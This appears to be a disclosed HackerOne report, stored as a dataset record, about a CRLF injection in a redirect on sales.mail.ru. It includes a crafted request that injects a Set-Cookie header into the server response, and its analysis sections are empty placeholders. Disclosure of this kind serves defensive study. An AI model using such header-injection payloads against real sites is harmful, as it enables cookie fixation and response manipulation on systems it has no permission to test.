---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '140851'
original_report_id: '140851'
title: '[sales.mail.ru] CRLF Injection'
team_handle: mailru
created_at: '2016-05-24T23:57:32.415Z'
disclosed_at: '2016-06-15T14:05:43.769Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
---

# [sales.mail.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 140851
- Weakness: 
- Program: mailru
- Disclosed At: 2016-06-15T14:05:43.769Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

В разделе **media** портала **sales.mail.ru** существует редирект, который удаляет GET-параметры:

> GET https://sales.mail.ru/media/foo?bar
> 
> 302 Moved Temporarily
> Location: http://sales.mail.ru/media/foo

Он подвержен CRLF-инъекции, что позволяет атакующему внедрить произвольный заголовок в ответ сервера:

> GET https://sales.mail.ru/media/%0ASet-Cookie:test=test?foo
> 
> 302 Moved Temporarily
> Location: http://sales.mail.ru/media/
> Set-Cookie: test=test

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
